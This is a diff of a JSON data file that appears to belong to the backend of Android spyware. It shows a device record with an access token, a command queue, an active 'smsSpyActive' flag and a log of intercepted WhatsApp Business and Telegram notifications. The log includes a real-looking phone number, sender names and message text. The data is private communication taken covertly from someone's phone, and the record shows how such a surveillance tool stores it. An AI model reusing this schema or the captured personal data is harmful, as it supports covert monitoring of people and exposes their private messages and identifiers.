@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633125517,
+    "lastSeen": 1775633128523,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "📡 Undangan admin saluran",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633130344
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎70 pesan dari 4 chat",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633127927
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "Permisi Azx",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633127897
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4302,30 +4326,6 @@
         "time": "08/04 14:02",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775631762060
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "13 new messages from 10 chats",
-        "time": "08/04 14:02",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631761939
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "?",
-        "time": "08/04 14:02",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631759547
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "?",
-        "time": "08/04 14:02",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631759428
       }
     ],
     "galleryPhotos": [],
